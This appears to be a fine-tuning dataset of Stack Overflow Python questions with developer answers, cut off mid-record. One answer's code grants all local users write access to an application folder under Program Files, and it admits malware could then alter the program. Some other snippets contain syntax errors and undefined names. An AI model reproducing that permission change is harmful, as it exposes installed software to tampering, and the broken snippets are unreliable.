{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n How to take only integer value in pandas dataframe<p>I am having below ct_data dataframe<\/p>\n<pre><code>imjp_number,imct_id\n182467224,'ed3baabac3ce4d86801d8490ea474963|pXJjGxufodMVq5FBSzHc2A'\n307291224,'__gde66a472fe104ab381456ee059751d9d|Qujk8BKa0XkkpJMCstCYBw'\n214278175,'mbKKbkKpiTsIAyCE8y07rw|e8133ceeca654d169532b4ad4de661d5'\ntes123456,'tMyM0un_ptsHHC-lET6tkQ|87538a4436af47a7a9b8b9bc2b3ec5ba'\nNot Found,'pXJjGxufodMVq5FBSzHc2A'\n<\/code><\/pre>\n<p>I am applying below logic but it's not working.<\/p>\n<pre><code>ct_data['imjp_number']  = ct_data.loc[ct_data['imjp_number'].apply(lambda x: isinstance(x,int)), 'imjp_number']\n<\/code><\/pre>\n<p>Please suggest me best way to select ct_data df having integer value only and remove 'tes12345' and 'Not found' value from imjp_number columns<\/p>","output_text":"<pre><code>&gt;&gt;&gt; print(df.to_string()) \n  imjp_number                                                     imct_id\n0   182467224     ed3baabac3ce4d86801d8490ea474963|pXJjGxufodMVq5FBSzHc2A\n1   307291224  __gde66a472fe104ab381456ee059751d9d|Qujk8BKa0XkkpJMCstCYBw\n2   214278175     mbKKbkKpiTsIAyCE8y07rw|e8133ceeca654d169532b4ad4de661d5\n3   tes123456     tMyM0un_ptsHHC-lET6tkQ|87538a4436af47a7a9b8b9bc2b3ec5ba\n4   Not Found                                      pXJjGxufodMVq5FBSzHc2A\n\n&gt;&gt;&gt; print(df.imjp_number.str.isdigit().to_string())\n0     True\n1     True\n2     True\n3    False\n4    False\n\n&gt;&gt;&gt; print(df[df.imjp_number.str.isdigit()].to_string())\n  imjp_number                                                     imct_id\n0   182467224     ed3baabac3ce4d86801d8490ea474963|pXJjGxufodMVq5FBSzHc2A\n1   307291224  __gde66a472fe104ab381456ee059751d9d|Qujk8BKa0XkkpJMCstCYBw\n2   214278175     mbKKbkKpiTsIAyCE8y07rw|e8133ceeca654d169532b4ad4de661d5\n&gt;&gt;&gt;\n<\/code><\/pre>\n<hr \/>\n<p>From the second question I linked to in the comment.<\/p>\n<pre><code>&gt;&gt;&gt; print(df.to_string())\n  imjp_number                                                     imct_id\n0   182467224     ed3baabac3ce4d86801d8490ea474963|pXJjGxufodMVq5FBSzHc2A\n1   307291224  __gde66a472fe104ab381456ee059751d9d|Qujk8BKa0XkkpJMCstCYBw\n2   214278175     mbKKbkKpiTsIAyCE8y07rw|e8133ceeca654d169532b4ad4de661d5\n3   tes123456     tMyM0un_ptsHHC-lET6tkQ|87538a4436af47a7a9b8b9bc2b3ec5ba\n4   Not Found                                      pXJjGxufodMVq5FBSzHc2A\n&gt;&gt;&gt;\n&gt;&gt;&gt; print(pd.to_numeric(df.imjp_number, errors='coerce').to_string())\n0    182467224.0\n1    307291224.0\n2    214278175.0\n3            NaN\n4            NaN\n&gt;&gt;&gt;\n&gt;&gt;&gt; print(pd.to_numeric(df.imjp_number, errors='coerce').notnull().to_string())\n0     True\n1     True\n2     True\n3    False\n4    False\n&gt;&gt;&gt;\n&gt;&gt;&gt; print(df[pd.to_numeric(df.imjp_number, errors='coerce').notnull()].to_string())\n  imjp_number                                                     imct_id\n0   182467224     ed3baabac3ce4d86801d8490ea474963|pXJjGxufodMVq5FBSzHc2A\n1   307291224  __gde66a472fe104ab381456ee059751d9d|Qujk8BKa0XkkpJMCstCYBw\n2   214278175     mbKKbkKpiTsIAyCE8y07rw|e8133ceeca654d169532b4ad4de661d5\n&gt;&gt;&gt;\n&gt;&gt;&gt; df = df[pd.to_numeric(df.imjp_number, errors='coerce').notnull()]              \n&gt;&gt;&gt; print(df.to_string())                                                           \n  imjp_number                                                     imct_id\n0   182467224     ed3baabac3ce4d86801d8490ea474963|pXJjGxufodMVq5FBSzHc2A\n1   307291224  __gde66a472fe104ab381456ee059751d9d|Qujk8BKa0XkkpJMCstCYBw\n2   214278175     mbKKbkKpiTsIAyCE8y07rw|e8133ceeca654d169532b4ad4de661d5\n&gt;&gt;&gt;\n<\/code><\/pre>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n Python - measure longest subsequence of a certain value in a list with tolerance for error<p>Given a list of integers <code>[0,0,0,1,1,0,2,2,0,1,0,0,2,1,2,2,2,2,1,...]<\/code>, I need to calculate the longest subsequence of elements of which x% of the elements are n, i.e. there is a tolerance whereby a subsequence which contains less than 1 - x% values other than n is still counted as an unbroken subsequence of n's.<\/p>\n\n<p>I have used the following one-liner to get the longest subsequence where all values are n, but I don't know where to go from here:<\/p>\n\n<pre><code>longest_subsequence_0 = max((len(l) for n, l in itertools.groupby(list) if n == 0))\n<\/code><\/pre>\n\n<p>If anyone could steer me in the right direction it would be much appreciated :D<\/p>","output_text":"<p>Just a sliding window changing size and computing the %. If above threshold, record the window size if this one is larger than the previous stored one.<\/p>\n\n<pre><code>def longest_sub(list, n, threshold):\n    largest_window = 0\n    for i in range(len(list)+1): # from i \n        for j in range(i+1,len(list)+1): # to j\n            window_len = len(list[i: j]) # store window size\n            if window_len &gt; largest_window: # if inspected window &gt; largest found yet\n                if list[i:j].count(n)\/window_len*100 &gt; threshold: # if percentage above threshold\n                    largest_window = window_len # new largest_window\n    return largest_window\n\nlongest_sub([0,0,0,1,1,0,2,2,0,1,0,0,2,1,2,2,2,2,1], 0, 30) # 9 \nlongest_sub([0,0,0,1,1,0,2,2,0,1,0,0,2,1,2,2,2,2,1], 0, 80) # 3\n<\/code><\/pre>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n Insert a list of containing one element into a pandas dataframe cell<p>I am trying to insert a list that only contains a single element into a cell in a dataframe.<\/p>\n<p>The table currently looks like this:<\/p>\n<pre><code>| Power | Duration |\n|-------|----------|\n| 73    |   [0]    |\n| 3     |   [0]    | \n<\/code><\/pre>\n<p>I created the table using this code:<\/p>\n<pre><code>df=pd.DataFrame(columns=['Power','Duration'])\ndf['Power'] = [73, 0]\ndf['Duration'] = [[0]] * 2\n<\/code><\/pre>\n<p>I would like to get the following:<\/p>\n<pre><code>| Power | Duration |\n|-------|----------|\n| 73    |   [1]    |\n| 3     |   [0]    | \n<\/code><\/pre>\n<p>I have tried using<\/p>\n<pre><code>df.loc[df['Power']==73, 'Duration'] = [1]\ndf.loc[df['Power']==73, 'Duration'] = [[1]]\n<\/code><\/pre>\n<p>but both of those returned<\/p>\n<pre><code>| Power | Duration |\n|-------|----------|\n| 73    |    1     |\n| 3     |   [0]    | \n<\/code><\/pre>\n<p>Using<\/p>\n<pre><code>df.loc[df['Power']==73, 'Duration'] = [[[1]]]\n<\/code><\/pre>\n<p>returned<\/p>\n<pre><code>| Power | Duration |\n|-------|----------|\n| 73    |  [[1]]   |\n| 3     |   [0]    | \n<\/code><\/pre>\n<p>I also tried<\/p>\n<pre><code>df.loc[df['Power']==73, 'Duration'].iloc[0] = [1]\n<\/code><\/pre>\n<p>but that bit of code did not make any changes to the table.<\/p>","output_text":"<p>You may use <code>df.apply<\/code> to include those elements in a list after you assigned that item:<\/p>\n<pre><code>df.loc[df['Power']==73, 'Duration'] = [1]\ndf.Duration.apply(lambda x: [x] if type(x) is not list else x)\n<\/code><\/pre>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n Is there a way to un-register an environment in Azure ML studio<p>I am trying to deploy a model in Azure ML and kept on getting the error 'model not found' from my score.py. So I decided to start from scratch again. I had my custom environment registered, and the Azure ML API for Environment class doesn't seem to have anything like 'delete' or 'unregister'. is there a way to work around this? Thanks<\/p>","output_text":"<p>You can use the <a href=\"https:\/\/docs.microsoft.com\/en-us\/python\/api\/azureml-core\/azureml.core.model.model?view=azure-ml-py&amp;preserve-view=true#delete--\" rel=\"nofollow noreferrer\">delete<\/a> method in the <a href=\"https:\/\/docs.microsoft.com\/en-us\/python\/api\/azureml-core\/azureml.core.model.model?view=azure-ml-py\" rel=\"nofollow noreferrer\">Model<\/a> class to delete a registered model.<\/p>\n<p>This can also be done via the Azure CLI as:<\/p>\n<pre><code>az ml model delete &lt;model id&gt;\n<\/code><\/pre>\n<p>Other commands can be found here: <a href=\"https:\/\/docs.microsoft.com\/en-us\/cli\/azure\/ext\/azure-cli-ml\/ml\/model?view=azure-cli-latest\" rel=\"nofollow noreferrer\">az ml model<\/a><\/p>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n How to run an EXE program in the background and get the outuput in python<p>I want to run an exe program in the background<br \/>\nLet's say the program is httpd.exe<br \/>\nI can run it but when I want to get the outupt It get stuck becuase there is no output if It starts successfully. But if there is an error It's OK.<\/p>\n<p>Here is the code I'm using:<\/p>\n<pre class=\"lang-py prettyprint-override\"><code>import asyncio\nimport os\n\nos.chdir('c:\\\\apache\\\\bin')\nprocess, stdout, stderr = asyncio.run(run('httpd.exe'))\nprint(stdout, stderr)\n\nasync def run(cmd):\n    proc = await asyncio.create_subprocess_exec(\n        cmd,\n        stdout=asyncio.subprocess.PIPE,\n        stderr=asyncio.subprocess.PIPE)\n\n    stdout, stderr = await proc.communicate()\n\n    return (proc, stdout, stderr)\n<\/code><\/pre>","output_text":"<p>I tried to make the following code as general as possible:<\/p>\n<ol>\n<li>I make no assumptions as to whether the program being run only writes its output to stdout alone or stderr alone. So I capture both outputs by starting two threads, one for each stream, and then write the output to a common queue that can be read in real time. When end-of-stream in encountered on each stdout and stderr, the threads write a special <code>None<\/code> record to the queue to indicate end of stream. So the reader of the queue know that after seeing two such &quot;end of stream&quot; indicators that there will be no more lines being written to the queue and that the process has effectively ended.<\/li>\n<li>The call to <code>subprocess.Popen<\/code> can be made with argument <em>shell=True<\/em> so that this can also built-in shell commands and also to make the specification of the command easier (it can now be a single string rather than a list of strings).<\/li>\n<li>The function <code>run_cmd<\/code> returns the created process and the queue. You just have to now loop reading lines from the queue until two <code>None<\/code> records are seen. Once that occurs, you can then just wait for the process to complete, which should be immediate.<\/li>\n<li>If you know that the process you are starting only writes its output to stdout or stderr (or if you only want to catch one of these outputs), then you can modify the program to start only one thread and specify the <code>subprocess.PIPE<\/code> value for only one of these outputs and then the loop that is reading lines from the queue should only be looking for one <code>None<\/code> end-of-stream indicator.<\/li>\n<li>The threads are <em>daemon<\/em> threads so that if you wish to terminate based on output from the process that has been read before all the end-of-stream records have been detected, then the threads will automatically be terminated along with the main process.<\/li>\n<li><code>run_apache<\/code>, which runs Apache as a subprocess, is itself a daemon thread. If it detects any output from Apache, it sets an event that has been passed to it. The main thread that starts <code>run_apache<\/code> can periodically test this event, wait on this event, wait for the <code>run_apache<\/code> thread to end (which will only occur when Apache ends) or can terminate Apache via global variable <code>proc<\/code>.<\/li>\n<\/ol>\n<pre class=\"lang-py prettyprint-override\"><code>import subprocess\nimport sys\nimport threading\nimport queue\n\n\ndef read_stream(f, q):\n    for line in iter(f.readline, ''):\n        q.put(line)\n    q.put(None) # show no more data from stdout or stderr\n\ndef run_cmd(command, run_in_shell=True):\n    &quot;&quot;&quot;\n    Run command as a subprocess. If run_in_shell is True, then\n    command is a string, else it is a list of strings.\n    &quot;&quot;&quot;\n    proc = subprocess.Popen(command, shell=run_in_shell, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)\n    q = queue.Queue()\n    threading.Thread(target=read_stream, args=(proc.stdout, q), daemon=True).start()\n    threading.Thread(target=read_stream, args=(proc.stderr, q), daemon=True).start()\n    return proc, q\n\nimport os\n\ndef run_apache(event):\n    global proc\n\n    os.chdir('c:\\\\apache\\\\bin')\n    proc, q = run_cmd(['httpd.exe'], False)\n    seen_None_count = 0\n    while seen_None_count &lt; 2:\n        line = q.get()\n        if line is None:\n            # end of stream from either stdout or stderr\n            seen_None_count += 1\n        else:\n            event.set() # Seen output line:\n            print(line, end='')\n    # wait for process to terminate, which should be immediate:\n    proc.wait()\n\n# This event will be set if Apache write output:\nevent = threading.Event()\nt = threading.Thread(target=run_apache, args=(event,), daemon=True)\nt.start()\n# Main thread runs and can test event any time to see if it has done any output:\nif event.is_set():\n    ...\n# The main thread can wait for run_apache thread to normally terminate,\n# will occur when Apache terminates:\nt.join()\n# or the main thread can kill Apache via global variable procL\nproc.terminate() # No need to do t.join() since run_apache is a daemon thread\n<\/code><\/pre>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n Polling an API with Flask and updating webpage if returned data has changed<p>I am building a custom Spotify music player using Flask on the backend to handle calls to the Spotify API. It gets information from the currently playing track and populates the local webpage. I now need to poll the Spotify API (every 2 seconds or so) to check whether the song has changed and if so, update the webpage (hopefully with JavaScript so there is no need to refresh the page). I am not sure how do this with Flask or if there is a better method to go about it. I believe I can solve the issue by creating and calling an asynchronous function to do the polling, but if a change was identified I'm not sure where to go from there.<\/p>\n<p>Here is the spotify view I have thus far. I am using the spotipy library inside custom auth and now_playing functions in a spotify.py file.<\/p>\n<pre><code>@app.route('\/spotify')\ndef spotify():\n\n    # Get Spotify instance and authorization token\n    authData = dev.auth()\n    sp = authData[0]\n    token = authData[1]\n\n    current = dev.now_playing(sp, token)\n\n    # Assign individual track information to variable for sending to web page via Jinja\n    separator = ', '\n    return render_template('spotify.html', \n        artists = separator.join(current[0]),\n        song = current[1],\n        album = current[2],\n        cover_url = current[3],\n        year = current[4],\n        auth_tok = token\n    )\n<\/code><\/pre>\n<p>I have limited web development experience and this is my first time using Flask. I am using this project to learn more but have hit this roadblock.<\/p>","output_text":"<p><strong>Concept<\/strong><\/p>\n<p>A great way to poll APIs is to schedule requests in javascript then wait a certain amount of time (no more than 10-30 seconds) for the server to hold the request to see if the song changes then return the result. If the result is found earlier than 10-30 seconds, the server returns it early. The client sees the request as in progress, and can receive it in the entire window the server has it as long as the request does not time out (exceeds 30+ seconds or so). You can also just simply request the url every few seconds to check, but that uses a lot of system resources.<\/p>\n<p><strong>API Code<\/strong><\/p>\n<pre class=\"lang-python prettyprint-override\"><code>from flask import Flask, redirect\nsong = &quot;&quot; # global identifier\n@app.route(&quot;\/track&quot;, methods=[&quot;GET&quot;])\ndef track():\n    for _ in range(10):\n        time.sleep(1)\n        global song # regrab the song value every iteration\n        current = dev.now_playing(sp, token) # get current song\n        if current[1] != song: # song changed\n            song = current[1]\n            return redirect(&quot;http:\/\/www.website.com\/spotify&quot;, code=302) #essentially an automatic refresh by redirecting to itself, and will regrab the song data!\n    return {}, 200 # give the client SOMETHING so the request doesn't timeout and error\n\n@app.route('\/spotify')\ndef spotify():\n    global song\n    # Get Spotify instance and authorization token\n    authData = dev.auth()\n    sp = authData[0]\n    token = authData[1]\n    current = dev.now_playing(sp, token)\n    # Assign individual track information to variable for sending to web page via Jinja\n    separator = ', '\n    song = &quot;&quot; # assign the song value to whatever is sent to the client\n    return render_template('spotify.html', \n        artists = separator.join(current[0]),\n        song = current[1],\n        album = current[2],\n        cover_url = current[3],\n        year = current[4],\n        auth_tok = token\n    )\n\n<\/code><\/pre>\n<p>The code provided will take requests from a client, then check to see if the value <code>global song<\/code> which represents the song when the client last refreshed the page is different than the current song the API is using. In the case it is, the server will send a redirect code so the client will redirect and essentially refresh the current page it is on, thus grabbing the song and information!<\/p>\n<p><strong>Javascript<\/strong><\/p>\n<p>The javascript code will use simple requests, and continuously grab the server data on the endpoint \/track using GET. It can be found <a href=\"https:\/\/levelup.gitconnected.com\/all-possible-ways-of-making-an-api-call-in-plain-javascript-c0dee3c11b8b\" rel=\"nofollow noreferrer\">here<\/a> or from simply researching by yourself javascript get requests. To continuously do requests, use the following code.<\/p>\n<pre class=\"lang-javascript prettyprint-override\"><code>function stopFunction(){\n        clearInterval(myVar); \/\/ stop the timer\n    }\n    $(document).ready(function(){\n        myVar = setInterval(&quot;makeRequest()&quot;, 1000);\n    });\n\n<\/code><\/pre>\n<p>This is not a scaleable piece of code I provided but should work for private access and can be adapted conceptually into a scaleable endpoint.<\/p>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n Cython: compiler flag -O3 seems deprecated<p>I used the details provided in <a href=\"https:\/\/stackoverflow.com\/questions\/33520619\/extra-compile-args-in-cython\">this question<\/a> to set the optimization flag to <code>'-o3'<\/code>. However, I have the following issue:<\/p>\n<ul>\n<li>if I use the upper case as <code>extra_compile_args=['-O3']<\/code>, I get the warning:\n<code>cl : Command line warning D9002 : ignoring unknown option '-O3'<\/code><\/li>\n<li>if I use the lower case as  <code>extra_compile_args=['-o3']<\/code>, I get the warning:\n<code>cl : Command line warning D9035 : option 'o' has been deprecated and will be removed in a future release<\/code><\/li>\n<\/ul>\n<p>How can I solve this?<\/p>","output_text":"<p>The <code>-O3<\/code> flag is only supported by gcc and clang. Since you seem to be using the MSVC compiler, you can use the <code>\/Ox<\/code> flag, see <a href=\"https:\/\/docs.microsoft.com\/en-us\/cpp\/build\/reference\/ox-full-optimization?view=msvc-160\" rel=\"nofollow noreferrer\">here<\/a> for more details.<\/p>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n How to run given Python script with class, init and main from cmd?<p>I'm supplid with script.py file with Python contents of which this is psuedo code:<\/p>\n<pre><code>import pandas as pd\nimport numpy as np\n\nparams = {...}\n\nclass SomeClass:\n    def __init__(self, ab):\n        self.ab = ab\n        self.de = None\n\n    def main(self):\n        self.foo()\n\n    @staticmethod\n    def DoSomethingUsefull(abc, params=params):\n        abc['x'] = abc['Red Fox'].copy()\n        return some_list(abc);\n    \n    def foo(self):\n        self.de = SomeClass.DoSomethingUsefull(self.ab)       \n        self.de['de'] = &quot;de&quot;\n<\/code><\/pre>\n<p>I cannot change the contents of the file, just use it as is. Eventually I need to execute the script from external (C#) code, currently trying to run from cmd (Python is installed). My question is how to execute from command line? If it's not possible to execute from command line and a wrapper script is needed, what will it look like?<\/p>\n<p>Using WinPython 3.9.10<\/p>","output_text":"<p>as @DeepSpace said, this file just contains a definition of a class, it won't do anything by itself.<\/p>\n<p>You can create a python file that instantiates the class and calls some of it's methods<\/p>\n<p>something like<\/p>\n<pre><code>import SomeClass\nab = {'Red Fox': 42}\nmyClass = SomeClass(ab)   # instantiate the class\nmyClass.main()            # call the main method.   \n<\/code><\/pre>\n<p>Bear also in mind that you will need to modify the File at least to correct the typos like <code>self.de - None<\/code> otherwise you won't be able to import the class.<\/p>\n<p>If you are going to modify the file anyway to create the typos (Yeah, I know you said you can't modify it, but you must), you could just make the file &quot;executable&quot; by putting the code outside the class like this:<\/p>\n<pre><code>if __name__ == &quot;__main__&quot;:\n    ab = {'Red Fox': 42}\n    myClass = SomeClass(ab)   # instantiate the class\n    myClass.main()            # call the main method.  \n<\/code><\/pre>\n<p>This way you don't need an extra file.<\/p>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n Random name generator for objects<p>I'm trying to generate a name for each Goblin object, but either they all have the same name or this error happens<\/p>\n<pre class=\"lang-py prettyprint-override\"><code>import random\n\nmax_enemies = 5\n\n\nclass Entity():\n    def __init__(self, name, max_hp, min_hp, attack_dmg):\n        self.name = name\n        self.max_hp = max_hp\n        self.min_hp = min_hp\n        attack_dmg = attack_dmg\n\nclass Goblin(Entity):\n    def __init__(self):\n        super().__init__()\n\n\nEnemies = []\n\n\ndef enemy_spawner():\n    for x in range(max_enemies):\n        random_name_gen = random.randint(1, 10)\n        Enemies.append(Goblin(random_name_gen))\n\nenemy_spawner()\n\nfor x in range(len(Enemies)):\n    print(Goblin.name)\n\n<\/code><\/pre>\n<p>The error<\/p>\n<blockquote>\n<p>AttributeError: type object 'Goblin' has no attribute 'name'<\/p>\n<\/blockquote>\n<p>I've tried making Goblin it's own class with a name but it didn't work either<\/p>","output_text":"<p>Your code doesn't produce the same error you posted, getting instead:<\/p>\n<pre class=\"lang-py prettyprint-override\"><code>&gt;&gt;&gt; enemy_spawner()\nTraceback (most recent call last):\n  File &quot;&lt;stdin&gt;&quot;, line 1, in &lt;module&gt;\n  File &quot;&lt;stdin&gt;&quot;, line 4, in enemy_spawner\nTypeError: __init__() takes 1 positional argument but 2 were given\n<\/code><\/pre>\n<p>That's expected though, because while your structure is good it's missing a key bit of boilerplate to make it work -- you need to pass the list of arguments down to the superclass's constructor. Try this instead:<\/p>\n<pre class=\"lang-py prettyprint-override\"><code>class Goblin(Entity):\n    def __init__(self, *args, **kwargs):\n        super().__init__(*args, **kwargs)\n<\/code><\/pre>\n<p>Or indeed simply omit the <code>__init__<\/code> method entirely!<\/p>\n<pre class=\"lang-py prettyprint-override\"><code>class Goblin(Entity):\n    pass\n<\/code><\/pre>\n<p>Also: to do the printing, you'll have to reference the Goblin instance instead of the Goblin class.<\/p>\n<pre class=\"lang-py prettyprint-override\"><code>for enemy in Enemies:\n    print(enemy.name)\n<\/code><\/pre>\n<hr \/>\n<p>Might I suggest a different way, though? Consider building a constructor inside <code>Entity<\/code> that produces a Goblin with a random name!<\/p>\n<pre class=\"lang-py prettyprint-override\"><code>class Entity:\n\n    # As above\n    def __init__(self, *args, **kwargs):\n        self.name = name\n        self.max_hp = max_hp\n        self.min_hp = min_hp\n        attack_dmg = attack_dmg\n\n    # this is new!\n    @classmethod\n    def with_random_name(cls, name_generator=some_name_generator_function, *args, **kwargs):\n        return cls(name=name_generator(), *args, **kwargs)\n\n# Set some default values if all goblins should be the same\nclass Goblin(Entity)\n    min_hp, max_hp = 5, 10  # or whatever\n    attack_damage = 2       # or whatever\n    \n    def __init__(self, name, min_hp, max_hp, attack_damage, *args, **kwargs):\n        super().__init__(*args,\n            min_hp=self.min_hp,\n            max_hp=self.max_hp,\n            attack_damage=self.attack_damage,\n            **kwargs)\n<\/code><\/pre>\n<p>This will let you do:<\/p>\n<pre class=\"lang-py prettyprint-override\"><code>for _ in range(num_enemies):\n    enemy = Goblin.with_random_name()\n    enemies.append(enemy)\n<\/code><\/pre>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n Running python program with admin priviledges without the UAC prompt<p>I am making a python app and compiled it using pyinstaller. There is no problem when the user installs the app only for himself\/herself , but when he\/she installs for all users, it gives a permission denied error.<\/p>\n<p>It's basically a chatbot I made for a project. When the program is run the first time, it takes some basic data from the user and stores in a file. There's no problem when the program is installed for that user only,i.e., the program in stored in the user's appdata folder.<\/p>\n<p>But when the user tries to install it for all users, i.e., the program is stored in the program files(x86) folder, it gives a permission error as the folder is system protected.<\/p>\n<p>I tried to bypass it by adding the --uac-admin flag, but it is not convenient to go through the UAC prompt every time the user wants to run the program.<\/p>\n<p>I wanted to know if there was a way to run the program as admin without the UAC prompt.<\/p>\n<p>Any help would be highly appreciated!<\/p>","output_text":"<ul>\n<li>you want all users to be able to modify your application in it's <strong>Program Files (x86)<\/strong> folder<\/li>\n<li>so have your installation program change the permissions on your folder<\/li>\n<li>so that <kbd>Everyone<\/kbd> has <strong>Full Control<\/strong> to the folder<\/li>\n<\/ul>\n<p>If you've decided that anyone should be able to modify your chat program at any time without having to be an administrator: then give them permission.<\/p>\n<p>Here's some pseudocode that will grant Full Control to all users.<\/p>\n<pre><code>procedure GrantAllUsersFullControlOfFileOrFolder(Path: string);\nconst\n    SECURITY_NULL_SID_AUTHORITY:    TSIDIdentifierAuthority = (Value: (0,0,0,0,0,0));  \/\/S-1-0  ntifs.h\n    SECURITY_WORLD_SID_AUTHORITY:   TSIDIdentifierAuthority = (Value: (0,0,0,0,0,1));  \/\/S-1-1\n    SECURITY_LOCAL_SID_AUTHORITY:   TSIDIdentifierAuthority = (Value: (0,0,0,0,0,2));  \/\/S-1-2\n    SECURITY_CREATOR_SID_AUTHORITY: TSIDIdentifierAuthority = (Value: (0,0,0,0,0,3));  \/\/S-1-3\n    SECURITY_NT_AUTHORITY:          TSIDIdentifierAuthority = (Value: (0,0,0,0,0,5));  \/\/S-1-5\n\n    \/\/Relative identifiers (RIDs)\n    SECURITY_NULL_RID  = 0;         \/\/in authority S-1-0\n    SECURITY_WORLD_RID = 0;         \/\/in authority S-1-1\n    SECURITY_LOCAL_RID = 0;         \/\/in authority S-1-2\n    SECURITY_CREATOR_OWNER_RID = 0; \/\/in authority S-1-3\n    SECURITY_CREATOR_GROUP_RID = 1; \/\/in authority S-1-3\n\n    SECURITY_BUILTIN_DOMAIN_RID = $00000020; \/\/ 32 --&gt; S-1-5-32\n    DOMAIN_ALIAS_RID_ADMINS     = $00000220; \/\/544 --&gt; S-1-5-32-544\n    DOMAIN_ALIAS_RID_USERS      = $00000221; \/\/545 --&gt; S-1-5-32-545 A local group that represents all users in the domain.\nvar\n    usersSID: PSID;\n\/\/  res: BOOL;\n    sd: PSECURITY_DESCRIPTOR;\n    oldAcl, newAcl: PACL;\n    dw: DWORD;\n    ea: EXPLICIT_ACCESS;\nbegin\n    \/\/Create a well-known SID for the &quot;Users&quot; group (S-1-5-32-545)\n    usersSid := StringToSid('S-1-5-32-545'); \/\/well-known &quot;Users&quot; group\n    try\n        \/\/Get the current DACL. Free SecurityDescriptor with LocalFree\n        sd := nil;\n        dw := GetNamedSecurityInfo(PChar(Path), SE_FILE_OBJECT, DACL_SECURITY_INFORMATION, nil, nil, @oldAcl, nil, {var}sd);\n        if (dw &lt;&gt; ERROR_SUCCESS) then\n            RaiseLastWin32Error;\n        try\n            \/\/ Initialize an EXPLICIT_ACCESS structure for the new ACE\n            ZeroMemory(@ea, SizeOf(EXPLICIT_ACCESS));\n            ea.grfAccessPermissions  := GENERIC_READ or GENERIC_WRITE or GENERIC_EXECUTE {or GENERIC_ALL}; \/\/Yes, it's not &quot;really&quot; full control\n            ea.grfAccessMode         := GRANT_ACCESS;\n            ea.grfInheritance        := SUB_CONTAINERS_AND_OBJECTS_INHERIT;\n            ea.Trustee.TrusteeForm   := TRUSTEE_IS_SID;\n            ea.Trustee.TrusteeType   := TRUSTEE_IS_GROUP; \/\/TRUSTEE_IS_WELL_KNOWN_GROUP;\n            ea.Trustee.ptstrName     := PChar(usersSID);\n\n            \/\/ Create a new ACL that merges the new ACE into the existing ACL. Use LocalFree to free newAcl\n            dw := SetEntriesInAcl(1, @ea, oldAcl, {var}newAcl); \/\/use LocalFree to free newAcl\n            if dw &lt;&gt; ERROR_SUCCESS then\n                RaiseLastOSError(dw);\n            try\n                \/\/Attach the new ACL as the object's new DACL\n                dw := SetNamedSecurityInfo(PChar(Path), SE_FILE_OBJECT, DACL_SECURITY_INFORMATION, nil, nil, newAcl, nil);\n                if (dw &lt;&gt; ERROR_SUCCESS) then\n                    RaiseLastWin32Error;\n            finally\n                LocalFree(HLOCAL(newAcl));\n            end;\n        finally\n            LocalFree(HLOCAL(sd));\n        end;\n    finally\n        LocalFree(HLOCAL(usersSid));\n    end;\nend;\n<\/code><\/pre>\n<p>It also means that malware can modify your program at any time. But you're OK with that, as you said you want any standard users to be able to modify it your app.<\/p>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n Deleting entries based on date with BeautifulSoup<p>I have a XML file which looks like this:<\/p>\n\n<pre><code>?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;\n  &lt;url&gt;\n    &lt;lastmod&gt;2020-02-04T16:21:00+01:00&lt;\/lastmod&gt;\n    &lt;loc&gt;https:\/\/www.h.com&lt;\/loc&gt;\n  &lt;\/url&gt;\n  &lt;url&gt;\n    &lt;lastmod&gt;2020-01-31T17:17:00+01:00&lt;\/lastmod&gt;\n    &lt;loc&gt;https:\/\/www.h.com&lt;\/loc&gt;\n  &lt;\/url&gt;\n  &lt;url&gt;\n    &lt;lastmod&gt;2020-01-27T13:53:00+01:00&lt;\/lastmod&gt;\n    &lt;loc&gt;https:\/\/www.h.coml&lt;\/loc&gt;\n  &lt;\/url&gt;\n<\/code><\/pre>\n\n<p>A datetime.date which looks like this:<\/p>\n\n<pre><code>datetime.date(2020, 02, 01)\n<\/code><\/pre>\n\n<p>Is it possible to use BeautifulSoup to delete\/igonre the content of an <code>&lt;url&gt;<\/code> tag, if the date in the <code>&lt;lastmod&gt;<\/code> tag is older than the given datetime.date? <\/p>\n\n<p>With a result like this:<\/p>\n\n<pre><code>?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;\n  &lt;url&gt;\n    &lt;lastmod&gt;2020-02-04T16:21:00+01:00&lt;\/lastmod&gt;\n    &lt;loc&gt;https:\/\/www.h.com&lt;\/loc&gt;\n  &lt;\/url&gt;\n<\/code><\/pre>\n\n<p>Can somebody help?<\/p>","output_text":"<p>Is this all right?<\/p>\n\n<pre><code>import time\nfrom simplified_scrapy.simplified_doc import SimplifiedDoc\nhtml = '''\n&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;\n&lt;url&gt;\n  &lt;lastmod&gt;2020-02-04T16:21:00+01:00&lt;\/lastmod&gt;\n  &lt;loc&gt;https:\/\/www.h.com&lt;\/loc&gt;\n&lt;\/url&gt;\n&lt;url&gt;\n  &lt;lastmod&gt;2020-01-31T17:17:00+01:00&lt;\/lastmod&gt;\n  &lt;loc&gt;https:\/\/www.h.com&lt;\/loc&gt;\n&lt;\/url&gt;\n&lt;url&gt;\n  &lt;lastmod&gt;2020-01-27T13:53:00+01:00&lt;\/lastmod&gt;\n  